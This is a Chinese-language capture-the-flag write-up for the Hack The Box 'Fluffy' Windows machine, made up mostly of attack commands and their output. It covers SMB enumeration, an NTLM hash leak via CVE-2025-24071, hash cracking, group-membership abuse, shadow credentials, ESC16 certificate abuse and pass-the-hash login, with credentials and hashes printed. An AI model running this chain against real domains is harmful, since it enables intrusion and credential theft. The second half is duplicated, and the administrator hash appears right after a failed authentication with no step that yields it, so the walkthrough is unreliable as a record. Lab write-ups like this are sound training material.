## Machine Information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
## attack
nmap端口扫描

![](attachments/Pasted%20image%2020250906125355.png)

配置hosts文件,尝试登录

```SHELL
evil-winrm -u j.fleischman -p J0elTHEM4n1990! -i 10.10.11.69
```

无法登录,smb枚举目录
```SHELL
crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --share
```
![](attachments/Pasted%20image%2020250906130655.png)

SMB枚举用户

```SHELL
crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --rid-brute
```

![](attachments/Pasted%20image%2020250906131052.png)

查看IT部门文件
```shell
smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
```

![](attachments/Pasted%20image%2020250906150609.png)

pdf提示了一些CVE编号

使用CVE-2025-24071[0x6rss/CVE-2025-24071_PoC: CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File](https://github.com/0x6rss/CVE-2025-24071_PoC)
responder抓取NTLM HASH

![](attachments/Pasted%20image%2020250906163723.png)

```
p.agila::FLUFFY:2e389d9803b7cdde:C511A65FED5D202381EED81633E9B5D6:010100000000000080281829E71EDC016ABC2FA6E10E91E00000000002000800550049005200340001001E00570049004E002D0047004100450043004B0053005700510052003400480004003400570049004E002D0047004100450043004B005300570051005200340048002E0055004900520034002E004C004F00430041004C000300140055004900520034002E004C004F00430041004C000500140055004900520034002E004C004F00430041004C000700080080281829E71EDC010600040002000000080030003000000000000000010000000020000000E0E99D84AD756A6B9F360C4AB4DFFBD3BFE59A13C086FE871DBB0F6A9A9DD40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

john爆破
![](attachments/Pasted%20image%2020250906165239.png)

经过bloodhound分析后将`p.agila`添加到组`SERVICE ACCOUNTS`中 对 `ca_svc`、`ldap_svc`、`winrm_svc` 等账户有 `GenericWrite` 权限

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila 
```

![](attachments/Pasted%20image%2020250907104912.png)添加影子证书

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'  
```

```BASH
> certipy-ad shadow auto -u 'p.agila@10.10.11.69' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'     
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e385eff2536c4c048f379f72e670af17'
[*] Adding Key Credential with device ID 'e385eff2536c4c048f379f72e670af17' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e385eff2536c4c048f379f72e670af17' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
>注意需要和目标对齐时间戳避免TGT的时间戳校验

登录目标机器获取第一个flag
![](attachments/Pasted%20image%2020250908214959.png)

获取ca_svc hash
```BASH
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
```

查找漏洞模板
```BASH
certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable
┌──(root㉿kali)-[~]
└─# cat 20250909050948_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

存在ESC16
```BASH
# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-09T15:51:08+00:00
    
# certipy-ad req -dc-ip '10.10.11.69' -u 'administrator' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -upn 'winrm_svc' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : winrm_svc
[*] Successfully updated 'ca_svc'

# certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator
[-] See the wiki for more information

```

登陆用户Administrator
```BASH
evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69
```

获取flag
获取ca_svc hash
```BASH
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
```

查找漏洞模板
```BASH
certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable
┌──(root㉿kali)-[~]
└─# cat 20250909050948_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

存在ESC16
```BASH
# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-09T15:51:08+00:00
    
# certipy-ad req -dc-ip '10.10.11.69' -u 'administrator' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

# certipy-ad account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -upn 'winrm_svc' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : winrm_svc
[*] Successfully updated 'ca_svc'

# certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator
[-] See the wiki for more information

```

登陆用户Administrator
```BASH
evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69
```

